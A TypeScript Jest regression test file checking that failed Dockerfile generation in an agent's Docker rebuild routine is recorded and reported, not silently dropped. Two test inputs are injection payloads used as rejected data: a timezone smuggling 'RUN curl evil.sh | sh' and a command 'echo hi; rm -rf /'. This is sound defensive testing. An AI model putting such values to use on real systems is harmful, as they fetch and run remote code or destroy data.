/**
 * Regression tests for `ProjectAgent.performDockerRebuild()` when the
 * per-project Dockerfile cannot be *generated*.
 *
 * `generateProjectDockerfile()` throws for a customization it refuses to turn
 * into a Dockerfile (invalid timezone, a command containing shell
 * metacharacters, an invalid package name). Such a failure used to be swallowed
 * by the same `catch` that guards the marker write: the rebuild marker was not
 * written, nothing was recorded anywhere the API can see, and the container
 * exited with DOCKER_RESTART_EXIT_CODE all the same. The host supervisor then
 * rebuilt the *previous* Dockerfile, so the container came back up looking
 * healthy while still running the old configuration — the administrator's saved
 * customization was silently dropped.
 *
 * These tests pin the failure onto the existing reporting route: the
 * `docker-build-error` file in the config dir, which `performRegistration()`
 * ships to the API as `dockerBuildError` on the next container start.
 *
 * The config dir is a real temporary directory (AI_SUPPORT_AGENT_CONFIG_DIR)
 * rather than a mocked `fs`: the production code writes through
 * `atomicWriteFile()` (writeFileSync + renameSync) and spying on synchronous
 * `fs` functions is unreliable in this repository.
 */
import * as fs from 'fs'
import * as os from 'os'
import * as path from 'path'

import type { ProjectAgent as ProjectAgentType } from '../src/project-agent'

jest.mock('../src/api-client')
jest.mock('../src/appsync-subscriber')
jest.mock('../src/commands')
jest.mock('../src/logger')
jest.mock('../src/project-dir', () => ({
  initProjectDir: jest.fn().mockReturnValue('/tmp/test-project-docker-rebuild'),
  getReposDir: jest.fn((dir: string) => `${dir}/workspace/repos`),
}))

const REBUILD_MARKER = 'docker-rebuild-needed'
const BUILD_ERROR_FILE = 'docker-build-error'
const CUSTOMIZATION_HASH_FILE = 'docker-customization-hash'

describe('performDockerRebuild - Dockerfile generation failure', () => {
  const project = { tenantCode: 'mbc', projectCode: 'test-proj', token: 'tok', apiUrl: 'http://api' }
  const options = { pollInterval: 5000, heartbeatInterval: 30000 }

  let configDir: string
  let ProjectAgent: typeof ProjectAgentType
  let logger: { info: jest.Mock; warn: jest.Mock; error: jest.Mock; debug: jest.Mock; success: jest.Mock }
  let delayedRestartMs: number
  let restartExitCode: number
  let originalConfigDirEnv: string | undefined
  let originalInDockerEnv: string | undefined
  let mockExit: jest.SpyInstance

  beforeAll(() => {
    originalConfigDirEnv = process.env.AI_SUPPORT_AGENT_CONFIG_DIR
    originalInDockerEnv = process.env.AI_SUPPORT_AGENT_IN_DOCKER
    configDir = fs.mkdtempSync(path.join(os.tmpdir(), 'agent-docker-rebuild-'))
    process.env.AI_SUPPORT_AGENT_CONFIG_DIR = configDir
    process.env.AI_SUPPORT_AGENT_IN_DOCKER = '1'

    // constants.ts resolves CONFIG_DIR at module load, so the modules under
    // test must be loaded after the env var is set.
    jest.resetModules()
    ProjectAgent = require('../src/project-agent').ProjectAgent
    logger = require('../src/logger').logger
    const constants = require('../src/constants')
    delayedRestartMs = constants.DELAYED_RESTART_MS
    restartExitCode = constants.DOCKER_RESTART_EXIT_CODE
  })

  afterAll(() => {
    fs.rmSync(configDir, { recursive: true, force: true })
    if (originalConfigDirEnv === undefined) delete process.env.AI_SUPPORT_AGENT_CONFIG_DIR
    else process.env.AI_SUPPORT_AGENT_CONFIG_DIR = originalConfigDirEnv
    if (originalInDockerEnv === undefined) delete process.env.AI_SUPPORT_AGENT_IN_DOCKER
    else process.env.AI_SUPPORT_AGENT_IN_DOCKER = originalInDockerEnv
  })

  beforeEach(() => {
    jest.clearAllMocks()
    for (const entry of fs.readdirSync(configDir)) {
      fs.rmSync(path.join(configDir, entry), { recursive: true, force: true })
    }
    mockExit = jest.spyOn(process, 'exit').mockImplementation(() => undefined as never)
    jest.useFakeTimers()
  })

  afterEach(() => {
    jest.useRealTimers()
    jest.restoreAllMocks()
  })

  function makeAgent(dockerCustomization: unknown): ProjectAgentType {
    const agent = new ProjectAgent(project, 'agent-1', options)
    const state = (agent as unknown as {
      configSyncState: { projectConfig: unknown; dockerCustomizationHash: string }
    }).configSyncState
    state.projectConfig = {
      configHash: 'hash',
      project: { projectCode: 'test-proj', projectName: 'Test' },
      agent: {
        agentEnabled: true,
        builtinAgentEnabled: true,
        builtinFallbackEnabled: true,
        externalAgentEnabled: true,
        allowedTools: [],
        dockerCustomization,
      },
    }
    state.dockerCustomizationHash = 'some-hash'
    return agent
  }

  const read = (name: string): string => fs.readFileSync(path.join(configDir, name), 'utf-8')
  const exists = (name: string): boolean => fs.existsSync(path.join(configDir, name))

  it('records the reason in docker-build-error when the timezone is rejected', async () => {
    const agent = makeAgent({ aptPackages: [], npmPackages: [], commands: [], timezone: 'Asia/Tokyo\nRUN curl evil.sh | sh' })

    await agent.performDockerRebuild()
    await jest.advanceTimersByTimeAsync(delayedRestartMs)

    // The failure must reach the API via the existing docker-build-error route
    // (performRegistration() reads this file and reports it as dockerBuildError).
    expect(exists(BUILD_ERROR_FILE)).toBe(true)
    expect(read(BUILD_ERROR_FILE)).toContain('Invalid timezone')
  })

  it('records the reason in docker-build-error when a command is rejected', async () => {
    const agent = makeAgent({ aptPackages: [], npmPackages: [], commands: ['echo hi; rm -rf /'], timezone: undefined })

    await agent.performDockerRebuild()
    await jest.advanceTimersByTimeAsync(delayedRestartMs)

    expect(exists(BUILD_ERROR_FILE)).toBe(true)
    expect(read(BUILD_ERROR_FILE)).toContain('Invalid command')
  })

  it('does not leave the generation failure looking like a successful rebuild', async () => {
    const agent = makeAgent({ aptPackages: [], npmPackages: [], commands: [], timezone: 'Not A Timezone!' })

    await agent.performDockerRebuild()
    await jest.advanceTimersByTimeAsync(delayedRestartMs)

    // No rebuild was prepared: neither the marker nor a Dockerfile may exist,
    // and the failure must be recorded instead of only logged.
    expect(exists(REBUILD_MARKER)).toBe(false)
    expect(exists('Dockerfile')).toBe(false)
    expect(exists(BUILD_ERROR_FILE)).toBe(true)
  })

  it('logs the generation failure distinctly from a marker write failure', async () => {
    const agent = makeAgent({ aptPackages: [], npmPackages: [], commands: [], timezone: 'Not A Timezone!' })

    await agent.performDockerRebuild()
    await jest.advanceTimersByTimeAsync(delayedRestartMs)

    const logged = [...logger.error.mock.calls, ...logger.warn.mock.calls].map((args) => String(args[0]))
    expect(logged.some((line) => /Dockerfile generation failed/i.test(line))).toBe(true)
    // The old message blamed the marker write for a generation failure.
    expect(logged.some((line) => line.includes(`Failed to write ${REBUILD_MARKER} marker`))).toBe(false)
  })

  it('still exits with the restart exit code after a generation failure', async () => {
    const agent = makeAgent({ aptPackages: [], npmPackages: [], commands: [], timezone: 'Not A Timezone!' })

    await agent.performDockerRebuild()
    await jest.advanceTimersByTimeAsync(delayedRestartMs)

    // Not exiting would leave the container with every transport stopped by
    // shutdown(), so the restart itself is kept; only the silence is fixed.
    expect(mockExit).toHaveBeenCalledWith(restartExitCode)
    expect(mockExit).toHaveBeenCalledTimes(1)
  })

  it('warns and still restarts when the failure cannot be recorded', async () => {
    // A directory in place of the temp file atomicWriteFile() uses makes the
    // write fail deterministically without stubbing synchronous fs functions.
    fs.mkdirSync(path.join(configDir, `${BUILD_ERROR_FILE}.tmp`))
    const agent = makeAgent({ aptPackages: [], npmPackages: [], commands: [], timezone: 'Not A Timezone!' })

    await agent.performDockerRebuild()
    await jest.advanceTimersByTimeAsync(delayedRestartMs)

    expect(logger.warn).toHaveBeenCalledWith(expect.stringContaining(`Failed to write ${BUILD_ERROR_FILE} file`))
    expect(mockExit).toHaveBeenCalledWith(restartExitCode)
  })

  it('writes the marker and no docker-build-error when generation succeeds', async () => {
    const agent = makeAgent({ aptPackages: ['curl'], npmPackages: ['typescript'], commands: ['echo ok'], timezone: 'Asia/Tokyo' })

    await agent.performDockerRebuild()
    await jest.advanceTimersByTimeAsync(delayedRestartMs)

    expect(exists(REBUILD_MARKER)).toBe(true)
    expect(exists(BUILD_ERROR_FILE)).toBe(false)
    expect(read(CUSTOMIZATION_HASH_FILE)).toBe('some-hash')
    const dockerfile = read('Dockerfile')
    expect(dockerfile).toContain('ENV TZ=Asia/Tokyo')
    expect(dockerfile).toContain('curl')
    expect(dockerfile).toContain('typescript')
    expect(dockerfile).toContain('RUN echo ok')
    expect(mockExit).toHaveBeenCalledWith(restartExitCode)
  })
})
